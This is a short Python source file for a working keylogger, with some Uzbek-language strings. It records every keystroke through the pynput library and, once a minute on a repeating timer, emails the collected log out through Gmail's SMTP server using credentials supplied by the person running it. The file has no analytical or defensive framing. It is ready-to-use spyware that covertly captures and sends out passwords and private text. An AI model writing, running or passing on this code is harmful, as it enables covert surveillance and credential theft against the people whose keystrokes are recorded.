import smtplib
import pynput.keyboard
import threading
import keylogger


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger ishga tushdi "
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_keypress(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = " "
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyword_listener = pynput.keyboard.Listener(on_press=self.process_keypress)
        with keyword_listener:
            self.report()
            keyword_listener.join()


my_keylogger = keylogger.Keylogger(60, "example@gmail.com", "16 xonali kod yozing")
my_keylogger.start()
